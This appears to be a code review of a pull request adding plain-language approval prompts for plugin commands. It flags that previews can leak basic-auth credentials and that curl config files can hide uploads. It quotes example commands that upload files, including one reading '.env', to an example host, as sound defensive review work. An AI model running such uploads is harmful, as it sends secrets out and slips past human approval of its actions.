## Summary

Needs changes before merge: the plain-language approval path is useful and has real proof, but simple mode still has approval-safety gaps where command previews can leak basic-auth credentials and curl config files can hide loaded transfer options while raw details are suppressed.

## What This Changes

This PR adds an opt-in `approvals.plugin.language` setting, plain-language plugin approval rendering, Telegram/Matrix/fallback wiring, docs/config schema updates, and approval-renderer regression tests.

## Best Possible Solution

Keep the opt-in plain-language renderer, but make simple mode fail closed for credentialed or config-file-driven network commands and add focused regressions before raw command details can be hidden.

## Reproduction Assessment

Yes for the review findings by source inspection: the redaction regex misses `-u/--user` while upload paths force a preview, and curl documents `-K/--config` as loading additional command-line arguments that the parser does not inspect. The broader PR is a feature/config change, not a current-main bug report.

## Solution Assessment

No, not yet. The config and channel wiring are plausible, but the approval renderer needs conservative handling for basic-auth previews and curl config files before `simple` mode can safely suppress the raw technical prompt.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.9

Full review comments:

- **[P1] Redact basic-auth flags in previews:** `src/infra/plugin-approvals.ts:327-338`
  - body: When a transfer command needs a preview, `redactSensitiveCommandText` can still leave curl/wget basic-auth credentials visible, for example `curl -u alice:s3cr3t --data-binary @notes.txt https://example.test/upload`. Since `simple` mode posts that preview to chat while hiding the raw technical block, redact `-u`/`--user`/proxy-user style credentials before emitting the preview.
  - confidence: 0.91
- **[P1] Fail closed on curl config files:** `src/infra/plugin-approvals.ts:1595-1600`
  - body: `curl -K upload.conf https://example.test` reads additional curl arguments from `upload.conf` as if they were on the command line, but this fallback renders it as a medium network request with no preview. A config file can contain upload/output options such as `data-binary = @.env`, so treat `-K`/`--config` as high-risk or show a preview before hiding raw details.
  - confidence: 0.87
